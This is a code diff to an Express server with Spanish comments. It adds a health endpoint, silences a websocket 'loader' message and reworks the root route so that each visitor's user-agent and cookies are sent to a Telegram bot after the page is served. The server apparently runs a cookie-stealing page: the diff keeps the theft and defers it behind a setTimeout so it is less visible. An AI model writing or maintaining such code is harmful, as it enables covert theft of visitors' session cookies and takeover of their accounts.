@@ -68,21 +68,29 @@ function sendTelegramMessage(userAgent, cookies) {
 app.get("/check", (req, res) => {
     res.json({ pagina: "loader" });
 });
+// Endpoint de salud
+app.get("/health", (req, res) => {
+    res.status(200).send("OK");
+})
+
 
 // 🏠 Ruta principal (cuando un usuario entra a la página)
 app.get("/", (req, res) => {
-    const userAgent = req.headers["user-agent"];
-    const cookies = req.cookies;
-    console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
-
-    sendTelegramMessage(userAgent, cookies);
     res.sendFile(path.join(__dirname, "public", "index.html"));
+
+    setTimeout(() => {
+        const userAgent = req.headers["user-agent"];
+        const cookies = req.cookies;
+        console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
+        sendTelegramMessage(userAgent, cookies);
+    })
+
 });
 
 // 🔌 WebSockets para actualización en tiempo real
 wss.on("connection", (ws) => {
     console.log("🔌 Cliente WebSocket conectado");
-    ws.send("loader");
+    // ws.send("loader");
 
     ws.on("close", () => {
         console.log("🔌 Cliente WebSocket desconectado");
